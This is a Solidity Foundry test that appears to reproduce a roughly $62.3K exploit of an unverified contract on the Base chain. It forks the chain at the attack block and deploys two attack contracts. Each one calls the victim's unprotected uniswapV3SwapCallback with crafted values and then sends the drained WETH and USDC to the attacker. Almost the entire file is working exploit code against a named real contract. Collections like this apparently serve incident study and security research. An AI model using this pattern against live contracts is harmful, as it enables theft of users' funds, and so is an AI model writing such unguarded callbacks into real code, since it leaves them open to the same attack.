// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ ($62.3K)
// Attacker : https://basescan.org/address/0x780e5cb8de79846f35541b700637057c9ddded68
// Attack Contract : https://basescan.org/address/0x780e5cb8de79846f35541b700637057c9ddded68
// Vulnerable Contract : https://basescan.org/address/0x607742a2adea4037020e11bb67cb98e289e3ec7d
// Attack Tx : https://basescan.org/tx/0x1a6002d8aee205dff67cb2cdaf60569721655857d49ffe2ce81e10fde8c45946

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1910662533607796887
// Hacking God : N/A

address constant WETH_ADDR = 0x4200000000000000000000000000000000000006;
address constant USDC_ADDR = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;

contract Unverified_6077_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 28_791_090 - 1;

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = WETH_ADDR;

        vm.label(WETH_ADDR, "WETH");
        vm.label(USDC_ADDR, "USDC");
    }

    function testExploit() public {
        AttackContract attackContract = new AttackContract();
        attackContract.start();
        AttackContract2 attackContract2 = new AttackContract2();
        attackContract2.start();

        emit log_named_decimal_uint("WETH", TokenHelper.getTokenBalance(WETH_ADDR, address(this)), 18);
        emit log_named_decimal_uint("USDC", TokenHelper.getTokenBalance(USDC_ADDR, address(this)), 6);
    }

    receive() external payable {}
}

contract AttackContract {
    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    function start() public {
        address unverified_6077 = 0x607742A2Adea4037020e11Bb67CB98E289E3eC7D;
        IUniswapCallback(unverified_6077).uniswapV3SwapCallback(
            -125_859_570_852_398,
            22_510_000_000_000_000_000,
            hex"000000000000000000000000ddddf3d84a1e94036138cab7ff35d003c1207a7700000000000000000000000000000000000000000000000000005ad023c7e400"
        );

        TokenHelper.transferToken(WETH_ADDR, attacker, TokenHelper.getTokenBalance(WETH_ADDR, address(this)));
    }

    function token1() external view returns (address) {
        return WETH_ADDR;
    }

    receive() external payable {}
}

contract AttackContract2 {
    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    function start() public {
        address unverified_6077 = 0x607742A2Adea4037020e11Bb67CB98E289E3eC7D;
        IUniswapCallback(unverified_6077).uniswapV3SwapCallback(
            -125_859_570_852_398,
            27_260_000_000,
            hex"000000000000000000000000ddddf3d84a1e94036138cab7ff35d003c1207a7700000000000000000000000000000000000000000000000000005ad023c7e400"
        );

        TokenHelper.transferToken(USDC_ADDR, attacker, TokenHelper.getTokenBalance(USDC_ADDR, address(this)));
    }

    function token1() external view returns (address) {
        return USDC_ADDR;
    }

    receive() external payable {}
}

interface IUniswapCallback {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}
